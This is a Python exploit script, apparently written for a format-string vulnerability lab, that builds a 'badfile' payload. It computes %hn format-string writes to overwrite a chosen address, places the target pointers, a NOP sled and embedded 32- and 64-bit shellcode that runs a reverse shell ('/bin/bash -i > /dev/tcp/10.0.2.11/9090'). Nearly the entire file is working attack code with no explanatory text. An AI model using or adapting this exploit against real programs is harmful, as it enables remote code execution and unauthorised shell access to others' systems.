#!/usr/bin/python3
import sys


def main(argv):
   #target_addr 0x0000555555558010
   #target_value 0x8877665544332211
                     

   #target_addr=0x00007fffffffe190+8
   #target_value='0x00007fffffffe550'
   print ('str',argv[1],argv[2])

   



   def value_to_str(argv):
      # 32-bit Generic Shellcode 
      shellcode_32 = (
         "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
         "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
         "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
         "/bin/bash*"
         "-c*"
         # The * in this line serves as the position marker         *
         "/bin/bash -i > /dev/tcp/10.0.2.11/9090 0<&1 2>&1           *"
         #"/bin/ls -l; echo '===== Success! ======'                  *"
         "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
         "BBBB"   # Placeholder for argv[1] --> "-c"
         "CCCC"   # Placeholder for argv[2] --> the command string
         "DDDD"   # Placeholder for argv[3] --> NULL
      ).encode('latin-1')


      # 64-bit Generic Shellcode 
      shellcode_64 = (
         "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
         "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
         "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
         "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
         "/bin/bash*"
         "-c*"
         # The * in this line serves as the position marker         *
         "/bin/bash -i > /dev/tcp/10.0.2.11/9090 0<&1 2>&1           *"
         #"/bin/ls -l; echo '===== Success! ======'                  *"
         "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
         "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
         "CCCCCCCC"   # Placeholder for argv[2] --> the command string
         "DDDDDDDD"   # Placeholder for argv[3] --> NULL
      ).encode('latin-1')

      N = 1500
      # Fill the content with NOP's
      content = bytearray(0x90 for i in range(N))

      # Choose the shellcode version based on your target
      shellcode = shellcode_64

      # Put the shellcode somewhere in the payload




      # code addr input+offset  00007fffffffe2f0+0x300 00007fffffffe5f0
      # code addr input+offset  00007fffffffe250+0x300 00007fffffffe550




      #s = '%58864x'+"%109$hn"+'%6671x'+"%110$hn"+'%32768x'+"%111$hn"+'%32769x'+"%112$hn" #54848  52437
      #s = '%58704x'+"%109$hn"+'%6831x'+"%110$hn"+'%32768x'+"%111$hn"+'%32769x'+"%112$hn" #54848  52437
      




      target_addr=int(argv[1],16)
      target_value=argv[2]


      input_len=len(target_value)
      value4=target_value[2:2+4]
      value3='0x'+target_value[6:6+4]
      value2='0x'+target_value[10:10+4]
      value1='0x'+target_value[14:14+4]
      #value1=bytes(value1,'UTF-8')
      #value1=int(value1.hex())
      value1_= int(value1,16)
      value2_= int(value2,16) 
      value3_= int(value3,16) 
      value4_= int(value4,16)
      output_str=[]
      if value1_==0:
         str1='%'+str(65536)+'x'
         output_str.append(str1)
      else:
         str1='%'+str(value1_)+'x'
         output_str.append(str1)
      if (value2_>value1_):
         value2p=value2_-value1_
         str2='%'+str(value2p)+'x'
         output_str.append(str2)
      else:
         value2p=value2_+65536
         value2p=value2p-value1_
         str2='%'+str(value2p)+'x'
         output_str.append(str2)
      if (value3_>value2_):
         value3p=value3_-value2_
         str3='%'+str(value3p)+'x'
         output_str.append(str3)
      else:
         value3p=value3_+65536
         value3p=value3p-value2_
         str3='%'+str(value3p)+'x'
         output_str.append(str3)
      if (value4_>value3_):
         value4p=value4_-value3_
         str4='%'+str(value4p)+'x'
         output_str.append(str4)
      else:
         value4p=value4_+65536
         value4p=value4p-value3_
         str4='%'+str(value4p)+'x'
         output_str.append(str4)

      print ('output',output_str[0],output_str[1],output_str[2],output_str[3])
      #output_str[0],output_str[1],output_str[2],output_str[3]='%65536x','%65536x','%65536x','%65536x'


      s = output_str[0]+"%109$hn"+output_str[1]+"%110$hn"+output_str[2]+"%111$hn"+output_str[3]+"%112$hn" #54848  52437
      fmt  = (s).encode('latin-1')
      content[0:0+len(fmt)] = fmt

      start=600
      #number  = 0x00007fffffffe230+8
      number  = target_addr
      content[start:start+8]  =  (number).to_bytes(8,byteorder='little')
      content[start+8:start+16]  =  (number+2).to_bytes(8,byteorder='little')
      content[start+16:start+24]  =  (number+4).to_bytes(8,byteorder='little')
      content[start+24:start+32]  =  (number+6).to_bytes(8,byteorder='little')

      offset=0x300


      content[offset:offset + len(shellcode)] = shellcode

      return content

   def auto_write(argv):
      content=value_to_str(argv)

      with open('badfile', 'wb') as f:
         f.write(content)
      
   auto_write(argv)
      

   



if __name__=='__main__':
   main(sys.argv)